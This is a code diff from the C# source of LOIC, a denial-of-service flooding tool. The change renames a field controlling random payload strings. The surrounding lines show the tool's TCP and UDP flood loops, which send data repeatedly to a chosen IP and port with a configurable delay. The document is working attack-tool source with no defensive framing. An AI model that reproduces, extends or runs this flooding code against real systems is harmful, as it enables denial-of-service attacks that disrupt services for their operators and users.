@@ -16,7 +16,7 @@ namespace LOIC
 		public int Delay;
 		public bool Resp;
 		public string Data;
-		private bool random;
+		private bool AllowRandom;
 
 		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
 		{
@@ -26,7 +26,7 @@ namespace LOIC
 			this.Delay = delay;
 			this.Resp = resp;
 			this.Data = data;
-			this.random = random;
+			this.AllowRandom = random;
 		}
 		public void Start()
 		{
@@ -58,7 +58,7 @@ namespace LOIC
 							while (IsFlooding)
 							{
 								FloodCount++;
-								buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, ( random ? new Functions().RandomString() : null ) ));
+								buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, (AllowRandom ? new Functions().RandomString() : null) ));
 								socket.Send(buf);
 								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
@@ -74,7 +74,7 @@ namespace LOIC
 							while (IsFlooding)
 							{
 								FloodCount++;
-								buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, ( random ? new Functions().RandomString() : null ) ));
+								buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, (AllowRandom ? new Functions().RandomString() : null) ));
 								socket.SendTo(buf, SocketFlags.None, RHost);
 								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
